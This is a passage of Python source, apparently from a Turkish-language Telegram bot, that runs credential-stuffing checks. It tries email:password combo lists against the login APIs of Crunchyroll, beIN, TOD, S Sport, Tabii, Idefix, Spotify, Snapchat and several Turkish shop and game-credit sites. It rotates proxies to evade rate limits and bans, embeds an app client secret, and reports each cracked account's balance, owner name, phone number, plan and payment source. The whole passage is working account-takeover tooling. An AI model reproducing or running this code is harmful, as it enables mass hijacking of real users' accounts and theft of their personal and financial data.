  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def epinfy_check_account(email, password):
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Origin": "https://epinfy.com",
    "Referer": "https://epinfy.com/",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/json, text/javascript, */*; q=0.01",
  })
  try:
    r = session.get("https://epinfy.com/", timeout=12)
    m = re.search(r'name="csrf_test_name"[^>]*value="([^"]+)"', r.text or "")
    if not m:
      return False, "ERROR", "CSRF yok"
    csrf = m.group(1)
    resp = session.post(
      "https://epinfy.com/login/loginClient",
      data={"csrf_test_name": csrf, "mail": email, "password": password},
      allow_redirects=True,
      timeout=12,
    )
    ok = False
    try:
      j = resp.json()
      ok = j.get("success") == 1
    except Exception:
      ok = "client" in (resp.url or "")
    if not ok:
      return False, "BAD", "login fail"
    page = session.get("https://epinfy.com/client/kontrol-paneli", timeout=12)
    html = page.text or ""
    bal = re.search(r'Bakiye.*?<div class="balance-value"[^>]*>([^<]+)', html, re.S | re.I)
    name = re.search(r'user-info-custom[^>]*>.*?<span[^>]*>([^<]+)', html, re.S)
    detail = f"Ad:{(name.group(1).strip() if name else 'N/A')} | Bakiye:{(bal.group(1).strip() if bal else 'N/A')}"
    return True, "SUCCESS", detail
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def spotify_check_account(email, password):
  try:
    r = requests.get(
      f"https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email={email}",
      headers={"User-Agent": "Mozilla/5.0", "Accept": "*/*"},
      timeout=15,
    )
    text = (r.text or "").lower()
    if '"status":1' in r.text:
      return False, "BAD", "kayıtlı değil"
    keys = [
      "already registered", "already in use",
      "that email is already registered",
      "ese correo electrónico ya está registrado",
    ]
    if any(k in text for k in keys):
      return True, "SUCCESS", "Email kayıtlı (VM)"
    return False, "BAD", "bilinmiyor"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def snapchat_check_account(email, password):
  try:
    r = requests.post(
      "https://bitmoji.api.snapchat.com/api/user/find",
      data=json.dumps({"email": email}),
      headers={
        "origin": "https://www.bitmoji.com",
        "accept": "application/json, text/plain, */*",
        "referer": "https://www.bitmoji.com/",
        "user-agent": "Mozilla/5.0",
        "content-type": "application/json",
      },
      timeout=12,
    )
    if r.status_code == 200:
      try:
        j = r.json()
        uid = j.get("user_id", "N/A")
      except Exception:
        uid = "N/A"
      return True, "SUCCESS", f"UserID:{uid}"
    if r.status_code in (204, 400):
      return False, "BAD", "yok"
    return False, "BAD", f"status {r.status_code}"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def run_predunyam_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_predunyam_jobs", "PREDUNYAM", "predunyam_stop", predunyam_check_account, 1.5)

def run_mackolik_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_mackolik_jobs", "MACKOLIK", "mackolik_stop", mackolik_check_account, 1.5)

def run_ozygame_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_ozygame_jobs", "OZYGAME", "ozygame_stop", ozygame_check_account, 0.8)

def run_capcut_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_capcut_jobs", "CAPCUT", "capcut_stop", capcut_check_account, 0.6)

def run_verisunucu_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_verisunucu_jobs", "VERISUNUCU", "verisunucu_stop", verisunucu_check_account, 0.8)

def run_smsonay_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_smsonay_jobs", "SMSONAY", "smsonay_stop", smsonay_check_account, 0.8)

def run_fenix_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_fenix_jobs", "FENIXOYUN", "fenix_stop", fenix_check_account, 0.6)

def run_ezglobal_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_ezglobal_jobs", "EZGLOBAL", "ezglobal_stop", ezglobal_check_account, 0.8)

def run_epinfy_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_epinfy_jobs", "EPINFY", "epinfy_stop", epinfy_check_account, 1.0)

def run_spotify_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_spotify_jobs", "SPOTIFY-VM", "spotify_stop", spotify_check_account, 1.2)

def run_snapchat_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_snapchat_jobs", "SNAPCHAT-VM", "snapchat_stop", snapchat_check_account, 0.5)


def medyabayim_check_account(username, password):
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept-Language": "tr-TR,tr;q=0.9",
  })
  try:
    r = session.get("https://medyabayim.com/", timeout=20)
    m = re.search(r'name="_csrf" value="(.*?)"', r.text or "")
    if not m:
      return False, "ERROR", "CSRF/IP"
    csrf = m.group(1)
    resp = session.post(
      "https://medyabayim.com/",
      data={"LoginForm[username]": username, "LoginForm[password]": password, "_csrf": csrf},
      headers={"Origin": "https://medyabayim.com", "Referer": "https://medyabayim.com/", "Content-Type": "application/x-www-form-urlencoded"},
      timeout=20,
    )
    t = resp.text or ""
    if "Yanlış kullanıcı adı veya şifre" in t:
      return False, "BAD", "login fail"
    if "Hoşgeldin" in t or "logout" in t.lower():
      bal = re.search(r'class="balance-dropdown__name.*?>(.*?)</div>', t)
      return True, "SUCCESS", f"Bakiye:{(bal.group(1).strip() if bal else '0 TL')}"
    return False, "BAD", "yanıt yok"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def bkm_check_account(email, password):
  try:
    r = requests.post(
      f"https://www.bkmkitap.com/srv/customer/signin/email/{email}",
      data={"password": password, "vendor": "0", "security": ""},
      headers={
        "Host": "www.bkmkitap.com",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.bkmkitap.com",
        "Referer": "https://www.bkmkitap.com/uye-girisi-sayfasi",
      },
      timeout=30,
    )
    t = r.text or ""
    if "hatalı" in t.lower() or "hatal\\u0131" in t:
      return False, "BAD", "login fail"
    if "Başarıyla giriş" in t or "Ba\\u015far\\u0131yla" in t:
      try:
        j = r.json()
        ad = j.get("customer_first_name", "")
        soy = j.get("customer_last_name", "")
        reg = j.get("customer_register_date", "")
        return True, "SUCCESS", f"İsim:{ad} {soy} | Kayıt:{reg}"
      except Exception:
        return True, "SUCCESS", "login OK"
    return False, "BAD", "login fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def barlas_check_account(username, password):
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Accept-Language": "tr-TR,tr;q=0.9",
    "Origin": "https://barlasmedya.com",
  })
  try:
    r = session.get("https://barlasmedya.com/", timeout=12)
    csrf = None
    for pat in (
      r'<meta\s+name="csrf-token"\s+content="([^"]+)"',
      r'name="_csrf"\s+value="([^"]+)"',
      r'csrfToken\s*=\s*["\']([^"\']+)["\']',
    ):
      m = re.search(pat, r.text or "")
      if m:
        csrf = m.group(1)
        break
    if not csrf:
      return False, "ERROR", "CSRF yok"
    resp = session.post(
      "https://barlasmedya.com/",
      data={"LoginForm[username]": username, "LoginForm[password]": password, "_csrf": csrf},
      headers={"Referer": "https://barlasmedya.com/"},
      timeout=12,
      allow_redirects=False,
    )
    if resp.status_code == 302:
      loc = resp.headers.get("Location", "") or ""
      if any(x in loc for x in ("dashboard", "panel", "/home")):
        return True, "SUCCESS", "login OK"
      return True, "SUCCESS", "redirect"
    t = (resp.text or "").lower()
    if "hoşgeldin" in t or "dashboard" in t:
      return True, "SUCCESS", "login OK"
    if "yanlış" in t or "hatalı" in t:
      return False, "BAD", "login fail"
    return False, "BAD", "login fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def idefix_check_account(email, password):
  try:
    sid = str(__import__("uuid").uuid4())
    headers = {
      "content-type": "application/json",
      "sessionid": sid,
      "user-agent": "Mozilla/5.0",
      "x-platform": "android",
    }
    r = requests.post(
      "https://fapi.idefix.com/ecom/customer/login",
      headers=headers,
      json={"mail": email, "password": password},
      timeout=12,
    )
    if r.status_code != 200 or "token" not in (r.text or ""):
      return False, "BAD", "login fail"
    tk = r.json().get("token")
    if not tk:
      return False, "BAD", "token yok"
    headers["token"] = tk
    info = requests.get("https://fapi.idefix.com/ecom/customer/account/info", headers=headers, timeout=10).json()
    sip = requests.get("https://fapi.idefix.com/ecom/order?page=1", headers=headers, timeout=10).json()
    ad = f"{info.get('firstName', '')} {info.get('lastName', '')}".strip() or "N/A"
    orders = sip.get("totalCount", 0)
    return True, "SUCCESS", f"Ad:{ad} | Sipariş:{orders}"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def oyuncustore_check_account(username, password):
  session = requests.Session()
  session.headers.update({"User-Agent": "Mozilla/5.0"})
  try:
    url = "https://oyuncustore.net/hesabim/?action=login"
    r = session.get(url, timeout=12)
    m = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text or "")
    if not m:
      m = re.search(r'name="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text or "")
    if not m:
      return False, "ERROR", "nonce yok"
    nonce = m.group(1)
    resp = session.post(
      url,
      data={
        "username": username,
        "password": password,
        "woocommerce-login-nonce": nonce,
        "_wp_http_referer": "/hesabim/?action=login",
        "login": "Oturum aç",
      },
      timeout=12,
    )
    t = resp.text or ""
    bad = ["kayıtlı değil", "zorunludur", "Parola alanı boş", "bilinmiyor"]
    if any(b.lower() in t.lower() for b in bad):
      return False, "BAD", "login fail"
    if "hesabim/downloads/" in (resp.url or "") or "/downloads/" in t:
      return True, "SUCCESS", "login OK"
    return False, "BAD", "login fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def oyundinar_check_account(user, password):
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept-Language": "tr-TR,tr;q=0.9",
  })
  try:
    r = session.get("https://www.oyundinar.com/hesap", timeout=12)
    csrf = session.cookies.get("csrf_cookie_name") or ""
    if not csrf:
      m = re.search(r'name="csrf_test_name"[^>]*value="([^"]+)"', r.text or "")
      csrf = m.group(1) if m else ""
    if not csrf:
      return False, "ERROR", "CSRF yok"
    data = f"csrf_test_name={csrf}&mail={user}&password={password}&btn+btn-primary+w-100=Giri%C5%9F+Yap"
    resp = session.post(
      "https://www.oyundinar.com/login/loginClient",
      data=data,
      headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.oyundinar.com/hesap",
        "Origin": "https://www.oyundinar.com",
      },
      allow_redirects=False,
      timeout=12,
    )
    loc = resp.headers.get("Location") or resp.headers.get("location") or ""
    refresh = resp.headers.get("Refresh") or resp.headers.get("refresh") or ""
    if "url=" in refresh:
      loc = refresh.split("url=")[-1]
    if "/hesap" in loc and "/client" not in loc:
      return False, "BAD", "login fail"
    if "/client" in loc:
      try:
        session.get(loc if loc.startswith("http") else "https://www.oyundinar.com" + loc, timeout=12)
      except Exception:
        pass
      page = session.get("https://www.oyundinar.com/client", timeout=12)
      bal = re.search(r'<div class="money">Bakiye:(.*?)</div', page.text or "", re.S)
      return True, "SUCCESS", f"Bakiye:{(bal.group(1).strip() if bal else '0 TL')}"
    return False, "BAD", "redirect yok"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def smsonaycom_check_account(email, password):
  session = requests.Session()
  try:
    r = session.post(
      "https://www.smsonay.com/ajax/login",
      data={"email": email, "password": password},
      headers={
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.smsonay.com",
        "Referer": "https://www.smsonay.com/login",
      },
      timeout=20,
    )
    t = (r.text or "").replace("\\u015f", "ş").replace("\\u0131", "ı")
    if "kontrol edip tekrar deneyin" in t:
      return False, "BAD", "login fail"
    if "Başarıyla giriş yaptınız" in t:
      page = session.get("https://www.smsonay.com/panel", timeout=15)
      html = page.text or ""
      name = re.search(r'class="fw-bolder d-flex align-items-center fs-5">(.*?)</div>', html, re.S)
      bal = re.search(r'class="btn btn-success me-2">Bakiye: (.*?)</a>', html, re.S)
      num = re.search(r'class="fs-2hx fw-bolder text-gray-800 me-2 lh-1">(.*?)</span>', html, re.S)
      detail = (
        f"Ad:{(name.group(1).strip() if name else 'N/A')} | "
        f"Bakiye:{(bal.group(1).strip() if bal else '0 TL')} | "
        f"Numara:{(num.group(1).strip() if num else '0')}"
      )
      return True, "SUCCESS", detail
    return False, "BAD", "login fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def _tod_bein_check(email, password, service_type="1"):
  import uuid as _uuid
  base = "https://mobileservice-smarttv.todtv.com.tr" if service_type == "1" else "https://mobileservice-smarttv.beinconnect.com.tr"
  label = "TODTV" if service_type == "1" else "BEIN"
  session = requests.Session()
  session.verify = False
  guid = str(_uuid.uuid4()).upper()
  try:
    session.post(
      f"{base}/api/init2",
      json={
        "DeviceName": "SMARTTV", "uuid": "1234", "device": "TV", "device_type": "SMARTTV",
        "os": "Windows10", "ClientVersion": "3.3.0b441", "username": "", "jailbroken": False,
        "DeviceLanguage": "TR", "DeviceId": guid, "DeviceOsVersion": "",
      },
      timeout=10,
    )
    r = session.post(f"{base}/api/login", json={"UserName": email, "Password": password}, timeout=10)
    t = r.text or ""
    if "bilgilerinizi kontrol" in t or 'isLogin":false' in t:
      return False, "BAD", "login fail"
    if "Client ip address is blocked" in t:
      return False, "ERROR", "IP ban"
    if "isLogin\":true" in t or "status\":\"ACTIVE" in t or "/Account/Authorize?" in t:
      return True, "SUCCESS", f"{label} login OK"
    if service_type == "1" and "Digiturk Uydu" in t:
      return True, "SUCCESS", "BEIN redirect"
    if service_type == "2" and "TOD" in t:
      return True, "SUCCESS", "TOD redirect"
    return False, "BAD", "unknown"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def todtv_check_account(email, password):
  return _tod_bein_check(email, password, "1")

def bein_check_account(email, password):
  return _tod_bein_check(email, password, "2")

def ssport_check_account(email, password):
  import string as _string
  try:
    chars = _string.ascii_lowercase + _string.digits
    sngt = "-".join([
      "".join(__import__("random").choice(chars) for _ in range(n))
      for n in (8, 4, 4, 4, 12)
    ])
    payload = {
      "action": "SubscriberLogin",
      "subscriber": {
        "LoginPreferedMethod": 0,
        "UILanguage": "tr",
        "Email": email,
        "PIN": password,
      },
      "Devices": [{"PlatformID": 10}],
      "TSID": int(time.time()),
    }
    r = requests.post(
      "https://api.ssportplus.com/mw/SubscriberLogin",
      headers={
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "api.ssportplus.com",
        "SNGT": sngt,
        "UILanguage": "tr",
        "User-Agent": "Android_Mobile/2.31.26",
      },
      json=payload,
      timeout=15,
    )
    t = r.text or ""
    if "hatalı girdiniz" in t:
      return False, "BAD", "login fail"
    if "SessionID" in t:
      try:
        j = r.json()
        sub = j.get("Subscriber", {})
        ad = f"{sub.get('FirstName', '')} {sub.get('LastName', '')}".strip() or "N/A"
        tel = sub.get("PhoneNumber") or "Yok"
        paket = sub.get("PackageName") or "FREE"
        return True, "SUCCESS", f"Ad:{ad} | Tel:{tel} | Paket:{paket}"
      except Exception:
        return True, "SUCCESS", "login OK"
    return False, "BAD", "unknown"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def tabii_check_account(email, password):
  try:
    did = "".join(__import__("random").choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(16))
    headers = {
      "Content-Type": "application/json; charset=UTF-8",
      "App-Bundle-Id": "com.trt.tabii.android",
      "App-Name": "Tabii",
      "App-Version": "90",
      "Authorization": "Bearer null",
      "Device-Id": did,
      "Device-Type": "AndroidPhone",
      "Host": "eu1.tabii.com",
      "Platform": "AndroidPhone",
      "User-Agent": "okhttp/4.11.0",
      "x-clientid": "ANDROID",
      "x-clientpass": "000",
      "x-uid": did,
    }
    r = requests.post(
      "https://eu1.tabii.com/apigateway/auth/v2/login",
      headers=headers,
      data=json.dumps({"email": email, "password": password}),
      timeout=12,
    )
    t = r.text or ""
    if any(k in t for k in ("loginError", "Şifreni", "Invalid")):
      return False, "BAD", "login fail"
    if "accessToken" not in t:
      return False, "BAD", "login fail"
    token = r.json().get("accessToken")
    headers["Authorization"] = f"Bearer {token}"
    me = requests.get("https://eu1.tabii.com/apigateway/auth/v2/me", headers=headers, timeout=10).json()
    name = me.get("name") or "N/A"
    title = me.get("title") or "-"
    prem = "Evet" if "Premium" in str(title) else "Hayır"
    return True, "SUCCESS", f"Ad:{name} | Premium:{prem}"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def run_medyabayim_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_medyabayim_jobs", "MEDYABAYIM", "medyabayim_stop", medyabayim_check_account, 4.0)

def run_bkm_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_bkm_jobs", "BKM-KITAP", "bkm_stop", bkm_check_account, 0.5)

def run_barlas_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_barlas_jobs", "BARLASMEDYA", "barlas_stop", barlas_check_account, 0.7)

def run_idefix_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_idefix_jobs", "IDEFIX", "idefix_stop", idefix_check_account, 0.6)

def run_oyuncustore_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_oyuncustore_jobs", "OYUNCUSTORE", "oyuncustore_stop", oyuncustore_check_account, 1.0)

def run_oyundinar_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_oyundinar_jobs", "OYUNDINAR", "oyundinar_stop", oyundinar_check_account, 0.8)

def run_smsonaycom_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_smsonaycom_jobs", "SMSONAY.COM", "smsonaycom_stop", smsonaycom_check_account, 0.8)

def run_todtv_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_todtv_jobs", "TODTV", "todtv_stop", todtv_check_account, 0.8)

def run_bein_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_bein_jobs", "BEIN", "bein_stop", bein_check_account, 0.8)

def run_ssport_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_ssport_jobs", "SSPORT", "ssport_stop", ssport_check_account, 0.6)

def run_tabii_check_and_send(chat_id, user_id, text: str):
  _run_simple_checker(chat_id, user_id, text, "active_tabii_jobs", "TABII", "tabii_stop", tabii_check_account, 0.6)

CR_CLIENT_ID = "rjs0ltx0dbwkliwxdzdf"
CR_CLIENT_SEC = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
CR_API = "https://beta-api.crunchyroll.com"
CR_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
CR_WUA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"
CR_PLANS = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}
CR_COUNTRY = {
  "TR": "Turkey", "US": "United States", "GB": "United Kingdom", "DE": "Germany",
  "FR": "France", "BR": "Brazil", "MX": "Mexico", "JP": "Japan", "IN": "India",
  "CA": "Canada", "AU": "Australia", "ES": "Spain", "IT": "Italy", "NL": "Netherlands",
}

def get_user_proxies(user_id):
  try:
    return list(user_checker_proxies.get(user_id) or [])
  except Exception:
    return []

def set_user_proxies(user_id, proxies):
  if proxies:
    user_checker_proxies[user_id] = list(proxies)
  else:
    user_checker_proxies.pop(user_id, None)

def _proxy_status_line(user_id):
  px = get_user_proxies(user_id)
  if px:
    return f"🔗 Proxy: **{len(px)}** adet (tüm checkerlarda aktif)"
  return "🔗 Proxy: **kapalı** (proxysiz)"

class _ProxySessionPatch:
  def __init__(self, proxy):
    self.proxy = proxy
    self._orig = None
  def __enter__(self):
    if not self.proxy:
      return self
    self._orig = requests.Session.request
    proxy = self.proxy
    def _patched(sess, method, url, **kwargs):
      kwargs.setdefault("proxies", {"http": proxy, "https": proxy})
      return self._orig(sess, method, url, **kwargs)
    requests.Session.request = _patched
    return self
  def __exit__(self, *a):
    if self._orig is not None:
      requests.Session.request = self._orig

def _cr_parse_proxy(raw):
  raw = (raw or "").strip()
  if not raw:
    return None
  if raw.startswith(("http://", "https://", "socks4://", "socks5://")):
    return raw
  parts = raw.split(":")
  if len(parts) == 4:
    return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
  if len(parts) == 2:
    return f"http://{parts[0]}:{parts[1]}"
  return f"http://{raw}"

def _cr_parse_proxy_list(text):
  out, seen = [], set()
  for line in (text or "").splitlines():
    line = line.strip()
    if not line or line.startswith("#"):
      continue
    p = _cr_parse_proxy(line)
    if p and p not in seen:
      seen.add(p)
      out.append(p)
  return out

def crunchyroll_check_account(email, password, proxy=None):
  session = requests.Session()
  if proxy:
    session.proxies = {"http": proxy, "https": proxy}
  try:
    device_id = str(__import__("uuid").uuid4())
    anon = str(__import__("uuid").uuid4())
    r = session.post(
      f"{CR_API}/auth/v1/token",
      data={
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "offline_access",
        "client_id": CR_CLIENT_ID,
        "client_secret": CR_CLIENT_SEC,
        "device_type": "Google SDK built for x86",
        "device_id": device_id,
        "device_name": "sdk_google_atv_x86",
      },
      headers={
        "User-Agent": CR_UA,
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "ETP-Anonymous-ID": anon,
        "Request-Type": "SignIn",
      },
      timeout=20,
    )
    src = r.text or ""
    if r.status_code == 429 or "too_many_requests" in src or "rate limited" in src.lower():
      return False, "ERROR", "rate limit"
    if any(k in src for k in ("invalid_grant", "invalid_credentials")) or r.status_code in (401, 400):
      return False, "BAD", "login fail"
    try:
      data = r.json()
    except Exception:
      return False, "ERROR", f"json {r.status_code}"
    token = data.get("access_token") or ""
    if not token:
      return False, "ERROR", "no token"
    hdr = {
      "Authorization": f"Bearer {token}",
      "User-Agent": CR_WUA,
      "Accept": "application/json, text/plain, */*",
    }
    username = ""
    try:
      mp = session.get(f"{CR_API}/accounts/v1/me/multiprofile", headers=hdr, timeout=15)
      m = re.search(r'"username"\s*:\s*"([^"]+)"', mp.text or "")
      if m:
        username = m.group(1)
    except Exception:
      pass
    me = {}
    try:
      me = session.get(f"{CR_API}/accounts/v1/me", headers=hdr, timeout=15).json()
    except Exception:
      me = {}
    extid = me.get("external_id", "")
    verified = me.get("email_verified", False)
    acc_id = me.get("account_id", "")
    if not username:
      username = me.get("username") or email.split("@")[0]
    if not extid:
      return True, "SUCCESS", f"FREE | User:{username} | Verified:{'Yes' if verified else 'No'}"
    ben = session.get(f"{CR_API}/subs/v1/subscriptions/{extid}/benefits", headers=hdr, timeout=15)
    bsrc = ben.text or ""
    nosub = any(x in bsrc for x in ("subscription.not_found", "Subscription Not Found", '"total":0', '"subscription_country":""'))
    if nosub or "concurrent_streams" not in bsrc:
      return True, "SUCCESS", f"FREE | User:{username} | Verified:{'Yes' if verified else 'No'}"
    streams = ""
    plan = ""
    sm = re.search(r'"concurrent_streams\.(\d+)"', bsrc)
    if sm:
      streams = sm.group(1)
      plan = CR_PLANS.get(streams, f"PLAN_{streams}")
    country = ""
    cm = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', bsrc)
    if cm:
      cc = cm.group(1)
      country = CR_COUNTRY.get(cc, cc)
    payment = ""
    pm = re.search(r'"source"\s*:\s*"([^"]+)"', bsrc)
    if pm:
      payment = pm.group(1)
    expires = renew = sku = ""
    if acc_id:
      try:
        sub3 = session.get(f"{CR_API}/subs/v3/subscriptions/{acc_id}", headers=hdr, timeout=15).text or ""
        em = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', sub3)
        if em:
          expires = em.group(1)
        rm = re.search(r'"auto_renew"\s*:\s*(true|false)', sub3)
        if rm:
          renew = "Yes" if rm.group(1) == "true" else "No"
        sk = re.search(r'"sku"\s*:\s*"([^"]+)"', sub3)
        if sk:
          sku = sk.group(1)
      except Exception:
        pass
    detail = (
      f"HIT | User:{username} | Plan:{plan or '?'} | Streams:{streams or '?'} | "
      f"Expires:{expires or '?'} | Renew:{renew or '?'} | Country:{country or '?'} | Pay:{payment or '?'}"
    )
    return True, "SUCCESS", detail
  except requests.exceptions.ProxyError:
    return False, "ERROR", "proxy dead"
  except requests.exceptions.Timeout:
    return False, "ERROR", "timeout"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:80]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:80]}"

def run_crunchyroll_check_and_send(chat_id, user_id, text: str, proxies=None):
  global active_crunchyroll_jobs
  if user_id in active_crunchyroll_jobs and not active_crunchyroll_jobs[user_id].get("stop"):
    try:
      bot.send_message(chat_id, "⚠️ Zaten bir CRUNCHYROLL taraması çalışıyor.", parse_mode="Markdown")
    except Exception:
      pass
    return
  lines = _parse_combo_lines(text)
  if not lines:
    try:
      bot.send_message(chat_id, "❌ Geçerli satır yok.\\nFormat: `email:şifre`", parse_mode="Markdown")
    except Exception:
      pass
    return
  if not proxies:
    proxies = get_user_proxies(user_id)
  proxies = proxies or []
  total = len(lines)
  workers = get_checker_workers(user_id)
  job = {"stop": False, "total": total, "checked": 0, "hits": 0, "bads": 0, "errors": 0, "msg_id": None, "chat_id": chat_id, "workers": workers}
  active_crunchyroll_jobs[user_id] = job
  try:
    px_info = f" · 🔗 {len(proxies)} proxy" if proxies else " · proxysiz"
    msg = bot.send_message(
      chat_id,
      _generic_checker_progress("CRUNCHYROLL", job) + px_info,
      reply_markup=_job_stop_markup("crunchyroll_stop"),
      parse_mode="Markdown",
    )
    job["msg_id"] = msg.message_id
  except Exception as e:
    log_error("crunchyroll_panel_start", e)
  hits = []
  last_refresh = 0.0
  px_i = [0]

  def _next_px():
    if not proxies:
      return None
    p = proxies[px_i[0] % len(proxies)]
    px_i[0] += 1
    return p

  def _refresh(force=False, finished=False, stopped=False):
    nonlocal last_refresh
    mid = job.get("msg_id")
    if not mid:
      return
    now = time.time()
    if not force and not finished and not stopped and (now - last_refresh) < 1.0:
      return
    last_refresh = now
    try:
      bot.edit_message_text(
        _generic_checker_progress("CRUNCHYROLL", job, finished=finished, stopped=stopped),
        chat_id, mid,
        reply_markup=None if (finished or stopped) else _job_stop_markup("crunchyroll_stop"),
        parse_mode="Markdown",
      )
    except Exception:
      pass

  stopped_early = False
  for i, (email, password) in enumerate(lines, 1):
    if active_crunchyroll_jobs.get(user_id, {}).get("stop"):
      stopped_early = True
      break
    ok, status, detail = crunchyroll_check_account(email, password, _next_px())
    if status == "ERROR" and "rate" in (detail or "").lower():
      time.sleep(3)
      ok, status, detail = crunchyroll_check_account(email, password, _next_px())
    job["checked"] = i
    if status == "SUCCESS":
      job["hits"] = int(job.get("hits") or 0) + 1
      hits.append(f"{email}:{password} | {detail}")
    elif status == "BAD":
      job["bads"] = int(job.get("bads") or 0) + 1
    else:
      job["errors"] = int(job.get("errors") or 0) + 1
    _refresh(force=(i % 3 == 0))
    if i < total and not active_crunchyroll_jobs.get(user_id, {}).get("stop"):
      time.sleep(0.7)
  stopped_early = stopped_early or bool(active_crunchyroll_jobs.get(user_id, {}).get("stop"))
  _refresh(force=True, finished=not stopped_early, stopped=stopped_early)
  checked = int(job.get("checked") or 0)
  try:
    bot.send_message(
      chat_id,
      f"🍥 **CRUNCHYROLL {'Durduruldu' if stopped_early else 'Sonuç'}**\\n\\n"
      f"📦 {checked}/{total} · ✅ HIT **{len(hits)}** · ❌ {job.get('bads', 0)} · ⚡ {job.get('errors', 0)}",
      parse_mode="Markdown",
    )
  except Exception:
